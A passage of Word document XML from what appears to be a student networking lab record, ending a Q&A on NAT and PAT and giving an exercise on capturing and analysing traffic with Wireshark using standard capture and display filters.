        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is Network Address Translation (NAT)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E98DA74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29016BE2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network Address Translation (NAT) is a technique that converts private IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36948B7A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>addresses into public IP addresses, allowing devices in a local network to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB7A102" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>communicate with the Internet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA8B3D3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Why is NAT used in computer networks?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39078749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70DDC8FE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAT is used to conserve public IP addresses and provide an additional layer of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0774B170" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>security by hiding internal network addresses from external networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C7BE3A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is the difference between a private IP address and a public IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D974CF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28631CD1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A private IP address is used within a local network and cannot be accessed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D553BD0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>directly from the Internet, while a public IP address is globally unique and used</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E49C1D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for Internet communication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6245E09F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Which device commonly performs NAT?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC716A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9BD6EF8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A router commonly performs Network Address Translation between internal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0356F990" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and external networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB0B825" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is PAT (Port Address Translation)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28952B13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7DA24440" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PAT, also called NAT Overload, allows multiple devices in a private network to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55214EF9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>share a single public IP address by using different port numbers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DF8CBB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1026DFD1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E650E65" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TO CAPTURE, SAVE, AND ANALYZE NETWORK TRAFFIC  USING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E61EBE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>WIRESHARK TOOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28364800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4574EDD5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To capture, save, and analyze network traffic on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D4E94F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP/UDP/IP/HTTP/ARP/DHCP/ICMP /DNS using Wireshark Tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500748E0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428396A9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Install Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D37B0B4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C82C507" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Download and install Wireshark from https://www.wireshark.org/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCD7D0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9415293" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Make sure to install the required packet capture drivers (e.g., WinPcap or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A09A8B2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Npcap on Windows).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F997F97" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Start Capturing Traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC0B645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21D5CFF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Open Wireshark.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8553A4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4E68C7B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Select the correct network interface for capturing (Wi-Fi, Ethernet, etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA80342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791B3C6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Click on the interface to start live capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAA80A1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Apply Capture Filters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67158830" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To reduce the amount of data captured, you can apply capture filters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40168243" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example filters for protocols:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A90229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468C34C1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP only: tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD09C8B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D123E76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FF31707" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>UDP only: udp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC71912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019A3DA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ARP only: arp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AFB3A4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98B856E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ICMP only: icmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488A813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48AD912" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DHCP (uses UDP ports 67 and 68): udp port 67 or udp port 68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB637B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2845FD1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DNS (uses UDP or TCP port 53): port 53</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5CA3D4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Save Captured Traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C05B9C2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2B414BB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>When done capturing, go to File &gt; Save As.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218C07D4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141504D8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Save the capture file in .pcapng or .pcap format for later analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0567881F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Analyze Captured Traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDDC2D5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Wireshark provides powerful tools to filter and analyze packets:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298860B6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Display Filters:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FF2FF34" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>You can filter displayed packets without limiting the saved capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58356CF8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Examples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14A24255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FD7815C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP: tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798A6F06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4ED239C2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>UDP: udp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FE95A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4EBF0646" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>IP: ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11607B88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D6FCA8D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>HTTP: http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BA5B44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7C4C0396" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ARP: arp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B328110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B8E081F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DHCP: bootp (DHCP is part of the BOOTP protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DA67C7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0FCC00F5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ICMP: icmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204D6B4F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51A77EF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DNS: dns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7377FB8A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF9D6AA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Follow Streams:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AD296C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>For TCP or UDP conversations, right-click a packet and select Follow &gt; TCP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491B0321" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Stream or Follow &gt; UDP Stream to see the conversation in readable form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C53DC3C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Protocol Hierarchy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2834BC12" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Use Statistics &gt; Protocol Hierarchy to get an overview of protocols present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1FC2F4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F86B7E5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Packet Details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E49C14D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Select any packet and expand protocol layers in the middle pane to analyze</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E89A395" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>headers and payload details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2155414E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Conversations:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB70D53" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Use Statistics &gt; Conversations to analyze communication between source and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8707A3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>destination hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3CD3ED" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Endpoints:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9B1186" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Go to Statistics &gt; Endpoints to list all active IP/MAC addresses involved in the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FC2721" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09761AF2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F4765B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>I/O Graphs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476D3CA0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Use Statistics &gt; I/O Graphs to visualize traffic rate and identify spikes or drops</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BBAF79" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>over time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F479DA1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Expert Information:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2977202D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Open Analyze &gt; Expert Information to detect errors, warnings, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1A2D65" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>retransmissions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394C6DBC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="441A8A4E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4938B757" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus network traffic on TCP/UDP/IP/HTTP/ARP/DHCP/ICMP /DNS were</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FDE58C1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>analyzed using Wireshark Tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFF96EA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
